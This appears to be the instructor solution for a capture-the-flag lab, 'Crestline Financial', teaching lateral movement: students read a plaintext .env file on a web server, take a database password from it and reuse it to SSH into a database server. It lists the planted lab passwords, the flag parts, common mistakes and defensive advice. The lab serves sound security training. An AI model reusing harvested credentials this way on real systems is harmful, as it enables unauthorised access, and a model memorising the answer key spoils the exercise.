# Crestline Financial: Credential Pivot Attack

## Overview

Students perform lateral movement from a compromised web server to an internal database server. The web application stores database credentials in plaintext configuration files. Students enumerate the filesystem, discover the leaked credentials, and use them to SSH to the database server where the second flag part awaits.

## Architecture

```
┌─────────────┐                     ┌──────────────┐     leaked creds     ┌──────────────┐
│   Student    │ ──── SSH:22 ─────▶ │  webserver    │ ─────────────────▶  │   dbserver    │
│   (Kali VM)  │                    │ (crestline    │    SSH pivot         │ (crestline    │
│              │ ──── SSH:22 ─────▶ │  web portal)  │                     │  database)    │
└─────────────┘   (after pivot)     └──────────────┘                      └──────────────┘
                                     Part 1: cr3d                          Part 2: p1v0t
```

## Solution Walkthrough

### Step 1: Connect to Web Server

```bash
ssh webdev@<webserver_ip>
# Password: Cr3st_W3b_2024#
```

### Step 2: Enumerate the Filesystem

```bash
ls -la /var/www/crestline-portal/
# Shows .env, config/, public/, logs/

cat /var/www/crestline-portal/.env
# Reveals DB_HOST=crestline-db, DB_USER=dbadmin, DB_PASS=F1n4nc3_DB_Pr0d#
```

### Step 3: Find Flag Part 1

```bash
cat /var/www/crestline-portal/config/api_keys.bak
# assessment_token=cr3d
```

**Part 1:** `cr3d`

### Step 4: Pivot to Database Server

```bash
# From webserver (or directly from attack box):
ssh dbadmin@<dbserver_ip>
# Password: F1n4nc3_DB_Pr0d#
```

### Step 5: Find Flag Part 2

```bash
ls /home/dbadmin/maintenance/
cat /home/dbadmin/maintenance/assessment_token.txt
# p1v0t
```

**Part 2:** `p1v0t`

### Step 6: Assemble Flag

```
OCR{cr3d_p1v0t}
```

## Common Mistakes

- **Not checking hidden files.** The `.env` file starts with a dot and won't show in `ls` without `-a`.
- **Ignoring backup files.** The `.bak` extension on `api_keys.bak` is a common source of credential leaks.
- **Not reading the full .env file.** Students may see `DB_HOST` and skip past the password field.
- **Trying to connect to PostgreSQL.** There's no actual PostgreSQL running; the credentials work for SSH (password reuse vulnerability).

## Defensive Recommendations

- Never store credentials in plaintext configuration files; use a secrets manager (Vault, AWS Secrets Manager)
- Restrict filesystem permissions on application config directories
- Remove backup files (.bak, .old, .backup) from production servers
- Use unique credentials per service; don't reuse database passwords for SSH access
- Implement network segmentation to prevent direct SSH access to database servers
